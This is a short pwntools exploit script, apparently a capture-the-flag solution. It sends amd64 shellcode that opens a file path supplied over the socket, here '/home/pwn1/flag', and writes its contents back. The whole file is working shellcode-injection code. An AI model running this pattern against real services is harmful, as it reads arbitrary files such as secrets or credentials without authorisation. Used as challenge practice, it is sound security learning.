#!/usr/bin/env python
from pwn import *

context.arch = 'amd64'

r = remote('127.0.0.1', 4000)
#r = remote('10.13.2.43', 10739)

shellcode = asm("""
    xor rax, rax
    xor rdi, rdi
    mov rsi, rsp
    mov rdx, 16
    syscall

    mov rax, 2
    mov rdi, rsp
    xor rsi, rsi
    xor rdx, rdx
    syscall

    mov rdi, rax
    xor rax, rax
    mov rsi, rsp
    mov rdx, 42
    syscall
    xor rax, rax
    syscall

    xor rax, rax
    inc rax
    xor rdi, rdi
    inc rdi
    syscall
""")

raw_input('#')

r.sendafter('Give me your shellcode (max = 87 bytes):', shellcode)

print len(shellcode)

sleep(0.5)

r.send('/home/pwn1/flag\x00')

r.interactive()
